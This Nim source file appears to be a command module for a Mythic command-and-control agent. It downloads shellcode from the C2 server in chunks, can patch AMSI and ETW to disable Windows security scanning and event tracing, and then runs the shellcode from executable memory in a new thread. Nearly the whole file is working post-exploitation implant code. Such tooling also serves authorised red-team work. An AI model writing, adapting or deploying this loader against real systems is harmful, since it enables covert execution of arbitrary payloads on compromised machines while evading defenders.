import ../utils/mythic_responses
import ../utils/debug
import std/[json, base64, strformat]

when defined(windows):
  import winim/lean
  import ../utils/patches

type
  DonutArgs = object
    uuid: string
    assembly_name: string
    assembly_arguments: string
    timeout: int
    patch_amsi_arg: bool
    block_etw_arg: bool

proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

proc donut*(taskId: string, params: JsonNode): JsonNode =
  ## Execute .NET assembly via donut-generated shellcode
  ## The Python side converts the assembly to shellcode using donut
  ## This nim side downloads and executes that shellcode
  when defined(windows):
    try:
      let args = to(params, DonutArgs)
      
      debug &"[DEBUG] Donut execution: {args.assembly_name}"
      debug &"[DEBUG] UUID for download: {args.uuid}"
      
      # Return initial response - request the file from Mythic
      return %*{
        "task_id": taskId,
        "upload": {
          "file_id": args.uuid,
          "chunk_num": 1,
          "chunk_size": 512000,
          "full_path": ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, "Donut error: " & e.msg)
  else:
    return mythicError(taskId, "donut command is only available on Windows")

proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string, 
                        totalChunks: int, currentChunk: int, 
                        fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the shellcode file being downloaded
  when defined(windows):
    try:
      let args = to(params, DonutArgs)
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          "task_id": taskId,
          "upload": {
            "chunk_size": 512000,
            "file_id": args.uuid,
            "chunk_num": currentChunk + 1,
            "full_path": ""
          }
        }
      
      # All chunks received - execute the shellcode
      return executeDonutShellcode(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, "Donut chunk processing error: " & e.msg)
  else:
    return mythicError(taskId, "donut command is only available on Windows")

proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Execute the downloaded donut shellcode
  ## This is called after the shellcode download is complete
  when defined(windows):
    try:
      let args = to(params, DonutArgs)
      
      debug &"[DEBUG] Executing donut shellcode ({shellcode.len} bytes)"
      
      var output = ""
      
      # Patch AMSI if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          output.add("[+] AMSI patched successfully\n")
        of 1:
          output.add("[-] Failed to patch AMSI\n")
        of 2:
          output.add("[+] AMSI already patched\n")
        else:
          discard
      
      # Block ETW if requested  
      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          output.add("[+] ETW patched successfully\n")
        of 1:
          output.add("[-] Failed to patch ETW\n")
        of 2:
          output.add("[+] ETW already patched\n")
        else:
          discard
      
      # Validate shellcode
      if shellcode.len == 0:
        return mythicError(taskId, "Shellcode is empty - file download may have failed")
      
      debug &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
      
      # Allocate executable memory
      let pShellcode = VirtualAlloc(
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      )
      
      if pShellcode == nil:
        let err = GetLastError()
        return mythicError(taskId, &"Failed to allocate memory for shellcode: VirtualAlloc failed with error {err} (size: {shellcode.len} bytes)")
      
      debug &"[DEBUG] Donut: Memory allocated, copying shellcode"
      
      # Copy shellcode to allocated memory
      copyMem(pShellcode, unsafeAddr shellcode[0], shellcode.len)
      
      debug "[DEBUG] Donut: Creating execution thread"
      
      # Create thread to execute shellcode
      var threadId: DWORD
      let hThread = CreateThread(
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](pShellcode),
        nil,
        0,
        addr threadId
      )
      
      if hThread == 0:
        let err = GetLastError()
        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
        return mythicError(taskId, &"Failed to create thread for shellcode execution: CreateThread failed with error {err}")
      
      # Wait for execution with timeout
      let timeoutMs = if args.timeout > 0: DWORD(args.timeout * 1000) else: 30000  # Default 30s like oopsie
      let timeoutSec = if args.timeout > 0: args.timeout else: 30
      
      debug &"[DEBUG] Donut: Waiting for execution to complete (timeout: {timeoutSec}s)"
      
      let waitResult = WaitForSingleObject(hThread, timeoutMs)
      
      debug &"[DEBUG] Donut: Wait completed with result: {waitResult}"
      
      # Append execution result to output
      case waitResult:
      of WAIT_OBJECT_0:
        output.add(&"[+] Donut shellcode executed successfully for {args.assembly_name}\n")
      of WAIT_TIMEOUT:
        output.add(&"[!] Donut shellcode execution timed out after {timeoutSec} seconds\n")
        discard TerminateThread(hThread, 0)
      else:
        output.add(&"[+] Donut shellcode execution completed with wait result: {waitResult}\n")
      
      output.add("\nNote: Assembly console output will appear in the agent's stdout/stderr.\n")
      output.add("For captured output, use execute-assembly command instead.\n")
      
      # Cleanup
      CloseHandle(hThread)
      discard VirtualFree(pShellcode, 0, MEM_RELEASE)
      
      return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, "Donut execution error: " & e.msg)
  else:
    return mythicError(taskId, "donut command is only available on Windows")
